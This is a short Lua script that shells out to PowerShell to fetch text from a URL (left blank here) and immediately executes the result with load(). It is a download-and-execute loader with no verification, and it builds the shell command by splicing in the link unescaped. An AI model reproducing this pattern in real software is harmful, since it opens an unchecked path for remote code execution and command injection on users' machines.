ScLink = ""
function getContent(link)
    local cmd = io.popen('powershell -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host (Invoke-RestMethod -Uri "'..link..'")"')
    content = cmd:read("a+")
    return content
end

load(getContent(ScLink))()
